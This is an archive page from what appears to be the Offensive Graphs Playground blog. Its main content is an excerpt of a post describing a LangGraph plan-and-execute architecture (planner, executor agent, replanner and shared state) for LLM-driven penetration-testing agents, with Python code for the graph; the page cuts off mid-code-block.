
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://offensivegraphs.ai/blog/archive/2024/">
      
      
        <link rel="prev" href="../../category/planning-and-decision-making/">
      
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.41">
    
    
      
        <title>2024 - Offensive Graphs Playground</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


  
  

<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-XVEVXNXJ44"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-XVEVXNXJ44",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-XVEVXNXJ44",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
  
    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
  

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#2024" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Offensive Graphs Playground" class="md-header__button md-logo" aria-label="Offensive Graphs Playground" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Offensive Graphs Playground
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              2024
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
    
      <div class="md-header__source">
        <a href="https://github.com/andreashappe/offensivegraphs" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Offensive Graphs Playground" class="md-nav__button md-logo" aria-label="Offensive Graphs Playground" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Offensive Graphs Playground
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/andreashappe/offensivegraphs" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome to the Playground
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Blog
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Blog
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blog
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Archive
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Archive
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
    
      
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    2024
  </span>
  

      </a>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Categories
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Categories
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../category/initial-journey/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    initial-journey
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../category/planning-and-decision-making/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    planning-and-decision-making
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
  <div class="md-content" data-md-component="content">
    <div class="md-content__inner">
      <header class="md-typeset">
        <h1 id="2024">2024</h1>
      </header>
      
        <article class="md-post md-post--excerpt">
  <header class="md-post__header">
    
      <nav class="md-post__authors md-typeset">
        
          <span class="md-author">
            <img src="https://avatars.githubusercontent.com/u/20667?v=4" alt="Andreas Happe">
          </span>
        
      </nav>
    
    <div class="md-post__meta md-meta">
      <ul class="md-meta__list">
        <li class="md-meta__item">
          <time datetime="2024-10-14 00:00:00">October 14, 2024</time></li>
        
          <li class="md-meta__item">
            in
            
              <a href="../../category/initial-journey/" class="md-meta__link">initial-journey</a>, 
              <a href="../../category/planning-and-decision-making/" class="md-meta__link">planning-and-decision-making</a></li>
        
        
          
          <li class="md-meta__item">
            
              8 min read
            
          </li>
        
      </ul>
      
    </div>
  </header>
  <div class="md-post__content md-typeset">
    <h2 id="adding-plan-and-execute-planner"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/">Adding Plan-and-Execute Planner</a></h2>
<p>All sources can be found in <a href="https://github.com/andreashappe/offensivegraphs/tree/dbe5ae76d044e6dc876dcb86029f853a30bac565">our github history</a>.</p>
<p>When using LLMs for complex tasks like hacking, a common problem is that they become hyper-focused upon a single attack vector and ignore all others. They go down a "depth-first" rabbit hole and never leave it. This was experienced by <a href="https://arxiv.org/abs/2310.11409">me</a> and <a href="https://arxiv.org/abs/2308.06782">others</a>.</p>
<h3 id="plan-and-execute-pattern"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#plan-and-execute-pattern">Plan-and-Execute Pattern</a></h3>
<p>One potential solution is the <a href="https://arxiv.org/abs/2305.04091">'plan-and-solve'-pattern</a> (often also named <a href="https://langchain-ai.github.io/langgraph/tutorials/plan-and-execute/plan-and-execute/">'plan-and-execute'-pattern</a>). in this strategy, one LLM (the <code>planner</code>) is given the task of creating a high-level task plan based upon the user-given objective. The task plan is processed by another LLM module (the <code>agent</code> or <code>executor</code>). Basically, the next step from the task plan is taken and forwarded to the executer to solve within in a limited number of steps or time.</p>
<p>The executor's result is passed back to another LLM module (the <code>replan</code> module) that updates the task plan with the new findings and, if the overall objective has not been achieved already, calls the executor agent with the next task step. The <code>replan</code> and <code>plan</code> LLM modules are typically very similar to each other, as we will see within our code example later.</p>
<p>An advanced version is Gelei's <code>Penetration Task Tree</code> <a href="https://arxiv.org/abs/2308.06782">detailed in the pentestGPT paper</a>.</p>
<p>Let's build a simple plan-and-execute prototype, highly influenced by the <a href="https://langchain-ai.github.io/langgraph/tutorials/plan-and-execute/plan-and-execute/">plan-and-execute langgraph example</a>.</p>
<h3 id="the-high-level-graph"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#the-high-level-graph">The High-Level Graph</a></h3>
<p>One benefit of using this blog for documenting our journey is that we can do the explanation in a non-linear (regarding the source code) order.</p>
<p>Let's start with the overall graph as defined through <code>create_plan_and_execute_graph</code>:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">graphs/plan_and_execute.py: Overall graph</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-73"> 73</a></span>
<span class="normal"><a href="#__codelineno-8-74"> 74</a></span>
<span class="normal"><a href="#__codelineno-8-75"> 75</a></span>
<span class="normal"><a href="#__codelineno-8-76"> 76</a></span>
<span class="normal"><a href="#__codelineno-8-77"> 77</a></span>
<span class="normal"><a href="#__codelineno-8-78"> 78</a></span>
<span class="normal"><a href="#__codelineno-8-79"> 79</a></span>
<span class="normal"><a href="#__codelineno-8-80"> 80</a></span>
<span class="normal"><a href="#__codelineno-8-81"> 81</a></span>
<span class="normal"><a href="#__codelineno-8-82"> 82</a></span>
<span class="normal"><a href="#__codelineno-8-83"> 83</a></span>
<span class="normal"><a href="#__codelineno-8-84"> 84</a></span>
<span class="normal"><a href="#__codelineno-8-85"> 85</a></span>
<span class="normal"><a href="#__codelineno-8-86"> 86</a></span>
<span class="normal"><a href="#__codelineno-8-87"> 87</a></span>
<span class="normal"><a href="#__codelineno-8-88"> 88</a></span>
<span class="normal"><a href="#__codelineno-8-89"> 89</a></span>
<span class="normal"><a href="#__codelineno-8-90"> 90</a></span>
<span class="normal"><a href="#__codelineno-8-91"> 91</a></span>
<span class="normal"><a href="#__codelineno-8-92"> 92</a></span>
<span class="normal"><a href="#__codelineno-8-93"> 93</a></span>
<span class="normal"><a href="#__codelineno-8-94"> 94</a></span>
<span class="normal"><a href="#__codelineno-8-95"> 95</a></span>
<span class="normal"><a href="#__codelineno-8-96"> 96</a></span>
<span class="normal"><a href="#__codelineno-8-97"> 97</a></span>
<span class="normal"><a href="#__codelineno-8-98"> 98</a></span>
<span class="normal"><a href="#__codelineno-8-99"> 99</a></span>
<span class="normal"><a href="#__codelineno-8-100">100</a></span>
<span class="normal"><a href="#__codelineno-8-101">101</a></span>
<span class="normal"><a href="#__codelineno-8-102">102</a></span>
<span class="normal"><a href="#__codelineno-8-103">103</a></span>
<span class="normal"><a href="#__codelineno-8-104">104</a></span>
<span class="normal"><a href="#__codelineno-8-105">105</a></span>
<span class="normal"><a href="#__codelineno-8-106">106</a></span>
<span class="normal"><a href="#__codelineno-8-107">107</a></span>
<span class="normal"><a href="#__codelineno-8-108">108</a></span>
<span class="normal"><a href="#__codelineno-8-109">109</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-73"><a id="__codelineno-8-73" name="__codelineno-8-73"></a><span class="k">def</span> <span class="nf">create_plan_and_execute_graph</span><span class="p">(</span><span class="n">llm</span><span class="p">,</span> <span class="n">execute_step</span><span class="p">):</span>
</span><span id="__span-8-74"><a id="__codelineno-8-74" name="__codelineno-8-74"></a>
</span><span id="__span-8-75"><a id="__codelineno-8-75" name="__codelineno-8-75"></a>    <span class="k">def</span> <span class="nf">should_end</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">PlanExecute</span><span class="p">):</span>
</span><span id="__span-8-76"><a id="__codelineno-8-76" name="__codelineno-8-76"></a>        <span class="k">if</span> <span class="s2">&quot;response&quot;</span> <span class="ow">in</span> <span class="n">state</span> <span class="ow">and</span> <span class="n">state</span><span class="p">[</span><span class="s2">&quot;response&quot;</span><span class="p">]:</span>
</span><span id="__span-8-77"><a id="__codelineno-8-77" name="__codelineno-8-77"></a>            <span class="k">return</span> <span class="n">END</span>
</span><span id="__span-8-78"><a id="__codelineno-8-78" name="__codelineno-8-78"></a>        <span class="k">else</span><span class="p">:</span>
</span><span id="__span-8-79"><a id="__codelineno-8-79" name="__codelineno-8-79"></a>            <span class="k">return</span> <span class="s2">&quot;agent&quot;</span>
</span><span id="__span-8-80"><a id="__codelineno-8-80" name="__codelineno-8-80"></a>
</span><span id="__span-8-81"><a id="__codelineno-8-81" name="__codelineno-8-81"></a>    <span class="k">def</span> <span class="nf">plan_step</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">PlanExecute</span><span class="p">):</span>
</span><span id="__span-8-82"><a id="__codelineno-8-82" name="__codelineno-8-82"></a>        <span class="n">planner</span> <span class="o">=</span> <span class="n">planner_prompt</span> <span class="o">|</span> <span class="n">llm</span><span class="o">.</span><span class="n">with_structured_output</span><span class="p">(</span><span class="n">Plan</span><span class="p">)</span>
</span><span id="__span-8-83"><a id="__codelineno-8-83" name="__codelineno-8-83"></a>        <span class="n">plan</span> <span class="o">=</span> <span class="n">planner</span><span class="o">.</span><span class="n">invoke</span><span class="p">({</span><span class="s2">&quot;messages&quot;</span><span class="p">:</span> <span class="p">[(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="n">state</span><span class="p">[</span><span class="s2">&quot;input&quot;</span><span class="p">])]})</span>
</span><span id="__span-8-84"><a id="__codelineno-8-84" name="__codelineno-8-84"></a>        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;plan&quot;</span><span class="p">:</span> <span class="n">plan</span><span class="o">.</span><span class="n">steps</span><span class="p">}</span>
</span><span id="__span-8-85"><a id="__codelineno-8-85" name="__codelineno-8-85"></a>
</span><span id="__span-8-86"><a id="__codelineno-8-86" name="__codelineno-8-86"></a>    <span class="k">def</span> <span class="nf">replan_step</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">PlanExecute</span><span class="p">):</span>
</span><span id="__span-8-87"><a id="__codelineno-8-87" name="__codelineno-8-87"></a>        <span class="n">replanner</span> <span class="o">=</span> <span class="n">replanner_prompt</span> <span class="o">|</span> <span class="n">llm</span><span class="o">.</span><span class="n">with_structured_output</span><span class="p">(</span><span class="n">Act</span><span class="p">)</span>
</span><span id="__span-8-88"><a id="__codelineno-8-88" name="__codelineno-8-88"></a>        <span class="n">output</span> <span class="o">=</span> <span class="n">replanner</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span><span id="__span-8-89"><a id="__codelineno-8-89" name="__codelineno-8-89"></a>        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">action</span><span class="p">,</span> <span class="n">Response</span><span class="p">):</span>
</span><span id="__span-8-90"><a id="__codelineno-8-90" name="__codelineno-8-90"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="n">output</span><span class="o">.</span><span class="n">action</span><span class="o">.</span><span class="n">response</span><span class="p">}</span>
</span><span id="__span-8-91"><a id="__codelineno-8-91" name="__codelineno-8-91"></a>        <span class="k">else</span><span class="p">:</span>
</span><span id="__span-8-92"><a id="__codelineno-8-92" name="__codelineno-8-92"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;plan&quot;</span><span class="p">:</span> <span class="n">output</span><span class="o">.</span><span class="n">action</span><span class="o">.</span><span class="n">steps</span><span class="p">}</span>
</span><span id="__span-8-93"><a id="__codelineno-8-93" name="__codelineno-8-93"></a>
</span><span id="__span-8-94"><a id="__codelineno-8-94" name="__codelineno-8-94"></a>    <span class="n">workflow</span> <span class="o">=</span> <span class="n">StateGraph</span><span class="p">(</span><span class="n">PlanExecute</span><span class="p">)</span>
</span><span id="__span-8-95"><a id="__codelineno-8-95" name="__codelineno-8-95"></a>
</span><span id="__span-8-96"><a id="__codelineno-8-96" name="__codelineno-8-96"></a>    <span class="c1"># Add the nodes</span>
</span><span id="__span-8-97"><a id="__codelineno-8-97" name="__codelineno-8-97"></a>    <span class="n">workflow</span><span class="o">.</span><span class="n">add_node</span><span class="p">(</span><span class="s2">&quot;planner&quot;</span><span class="p">,</span> <span class="n">plan_step</span><span class="p">)</span>
</span><span id="__span-8-98"><a id="__codelineno-8-98" name="__codelineno-8-98"></a>    <span class="n">workflow</span><span class="o">.</span><span class="n">add_node</span><span class="p">(</span><span class="s2">&quot;agent&quot;</span><span class="p">,</span> <span class="n">execute_step</span><span class="p">)</span>
</span><span id="__span-8-99"><a id="__codelineno-8-99" name="__codelineno-8-99"></a>    <span class="n">workflow</span><span class="o">.</span><span class="n">add_node</span><span class="p">(</span><span class="s2">&quot;replan&quot;</span><span class="p">,</span> <span class="n">replan_step</span><span class="p">)</span>
</span><span id="__span-8-100"><a id="__codelineno-8-100" name="__codelineno-8-100"></a>
</span><span id="__span-8-101"><a id="__codelineno-8-101" name="__codelineno-8-101"></a>    <span class="c1"># set the start node</span>
</span><span id="__span-8-102"><a id="__codelineno-8-102" name="__codelineno-8-102"></a>    <span class="n">workflow</span><span class="o">.</span><span class="n">add_edge</span><span class="p">(</span><span class="n">START</span><span class="p">,</span> <span class="s2">&quot;planner&quot;</span><span class="p">)</span>
</span><span id="__span-8-103"><a id="__codelineno-8-103" name="__codelineno-8-103"></a>
</span><span id="__span-8-104"><a id="__codelineno-8-104" name="__codelineno-8-104"></a>    <span class="c1"># configure links between nodes</span>
</span><span id="__span-8-105"><a id="__codelineno-8-105" name="__codelineno-8-105"></a>    <span class="n">workflow</span><span class="o">.</span><span class="n">add_edge</span><span class="p">(</span><span class="s2">&quot;planner&quot;</span><span class="p">,</span> <span class="s2">&quot;agent&quot;</span><span class="p">)</span>
</span><span id="__span-8-106"><a id="__codelineno-8-106" name="__codelineno-8-106"></a>    <span class="n">workflow</span><span class="o">.</span><span class="n">add_edge</span><span class="p">(</span><span class="s2">&quot;agent&quot;</span><span class="p">,</span> <span class="s2">&quot;replan&quot;</span><span class="p">)</span>
</span><span id="__span-8-107"><a id="__codelineno-8-107" name="__codelineno-8-107"></a>    <span class="n">workflow</span><span class="o">.</span><span class="n">add_conditional_edges</span><span class="p">(</span><span class="s2">&quot;replan&quot;</span><span class="p">,</span> <span class="n">should_end</span><span class="p">)</span>
</span><span id="__span-8-108"><a id="__codelineno-8-108" name="__codelineno-8-108"></a>
</span><span id="__span-8-109"><a id="__codelineno-8-109" name="__codelineno-8-109"></a>    <span class="k">return</span> <span class="n">workflow</span>
</span></code></pre></div></td></tr></table></div>
<p>The overall flow is defined in line 94 and following. You can see the mentioned nodes: <code>planner</code>, <code>agent</code> (the executor)and <code>replan</code> and a graph that follows the outline described in the introduction.</p>
<p><code>should_end</code> (line 75) is the exit-condition: if the replanner is not calling the sub-agent (<code>agent</code>), it can only send a message to the initial human (within the field <code>response</code>). The function detects this response and subsequently exits the graph.</p>
<h4 id="shared-state"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#shared-state">Shared State</a></h4>
<p>The shared state describes the data that is stored within the graph, i.e., the data that all our nodes will have access to. It is defined through <code>PlanExecute</code>:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">graphs/plan_and_execute.py: Shared State</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-45">45</a></span>
<span class="normal"><a href="#__codelineno-9-46">46</a></span>
<span class="normal"><a href="#__codelineno-9-47">47</a></span>
<span class="normal"><a href="#__codelineno-9-48">48</a></span>
<span class="normal"><a href="#__codelineno-9-49">49</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-45"><a id="__codelineno-9-45" name="__codelineno-9-45"></a><span class="k">class</span> <span class="nc">PlanExecute</span><span class="p">(</span><span class="n">TypedDict</span><span class="p">):</span>
</span><span id="__span-9-46"><a id="__codelineno-9-46" name="__codelineno-9-46"></a>    <span class="nb">input</span><span class="p">:</span> <span class="nb">str</span> <span class="c1"># the initial user-given objective</span>
</span><span id="__span-9-47"><a id="__codelineno-9-47" name="__codelineno-9-47"></a>    <span class="n">plan</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span>
</span><span id="__span-9-48"><a id="__codelineno-9-48" name="__codelineno-9-48"></a>    <span class="n">past_steps</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="n">Tuple</span><span class="p">],</span> <span class="n">operator</span><span class="o">.</span><span class="n">add</span><span class="p">]</span>
</span><span id="__span-9-49"><a id="__codelineno-9-49" name="__codelineno-9-49"></a>    <span class="n">response</span><span class="p">:</span> <span class="nb">str</span> <span class="c1"># response from the agent to the user</span>
</span></code></pre></div></td></tr></table></div>
<p>We store the following data:</p>
<ul>
<li><code>input</code>: the initially given user question/objective, i.e., "I want to become root"</li>
<li><code>response</code>: the final answer given by our LLM to the user question</li>
<li><code>plan</code>: a (string) list of planning steps that need to be performed to hopefully solve the user question</li>
<li><code>past_steps</code>: a list of already performed planning steps. In our implementation this also contains a short summary (given by the execution agent) about the operations performed by the execution agent (stored for each past step).</li>
</ul>
<h3 id="graph-nodesactions"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#graph-nodesactions">Graph Nodes/Actions</a></h3>
<p><code>planner</code> and <code>replan</code> are implemented through <code>plan_step</code> and <code>replan_step</code> respectively. The <code>agent</code> (or executor) is passed in as <code>execute_step</code> function parameter as this allows us to easily reuse the generic plan-and-execute graph for different use-cases.</p>
<h4 id="planner"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#planner">Planner</a></h4>
<p>Let's look at the planner next. It is implemented as a LLM call using <code>llm.with_structured_output</code> to allow for automatic output parsing into the <code>Plan</code> data structure:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">graphs/plan_and_execute.py: Plan data structure</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-52">52</a></span>
<span class="normal"><a href="#__codelineno-10-53">53</a></span>
<span class="normal"><a href="#__codelineno-10-54">54</a></span>
